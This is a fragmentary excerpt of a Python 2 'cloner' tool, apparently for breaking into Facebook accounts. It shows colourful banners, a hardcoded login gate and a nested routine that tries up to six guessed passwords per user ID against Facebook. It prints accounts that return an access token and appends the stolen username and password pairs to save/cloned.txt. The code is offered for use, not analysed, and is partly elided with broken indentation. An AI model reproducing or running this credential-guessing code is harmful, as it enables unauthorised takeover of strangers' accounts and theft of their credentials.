...
\033[1;96m_____ _                                               
\033[1;96m/  __ \ |                      
\033[1;95m| /  \/ | ___  _ __   ___ _ __ 
\033[1;95m| |   | |/ _ \| '_ \ / _ \ '__|
\033[1;96m| \__/\ | (_) | | | |  __/ |   
\033[1;96m\____/_|\___/|_| |_|\___|_|   
...
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mZalim Cloner.                                
\033[0;91m║\033[0;91mFB ACC :\033[0;92m "cute.sadia.malik"                                                  
\033[0;91m║ \033[0;93mWhtsap:\033[0;91m+92310bs                                        
\033[0;95m╰════════════════════════════════════════════╯
...
logo2 = """
 ...
 \033[1;96m To Zalim Cloner Tool 💜
...
\033[1;91mWhat's App Number Chutti kaar chal

                                                
\033[1;96m-----------------Zalim💜Cloner--------------------------
"""
CorrectUsername = "zalim"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://m.facebook.com/cute.sadia.malik')
    else:
...
def action():
    ...
    jalan ('\033[1;96m Total Number of IDs: '+xxxxxxx)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(Love-you)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(BAWA-G) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Love-you)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(BAWA-G) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Love-you)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(BAWA-G) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Love-you)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(BAWA-G) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Love-you)  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(BAWA-G) ' + k + c + user + '  |  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95myoutube\033[1;97mhttps://w ww.facebook.com/cute.sadia.malik"""
